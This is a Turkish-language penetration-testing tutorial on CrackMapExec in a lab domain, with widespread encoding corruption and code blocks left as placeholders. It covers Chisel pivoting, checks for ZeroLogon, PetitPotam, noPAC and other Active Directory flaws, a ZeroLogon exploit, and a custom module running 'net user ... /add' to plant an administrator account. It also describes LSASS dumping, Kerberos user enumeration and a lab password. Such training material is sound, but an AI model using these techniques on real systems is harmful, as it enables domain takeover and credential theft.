Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

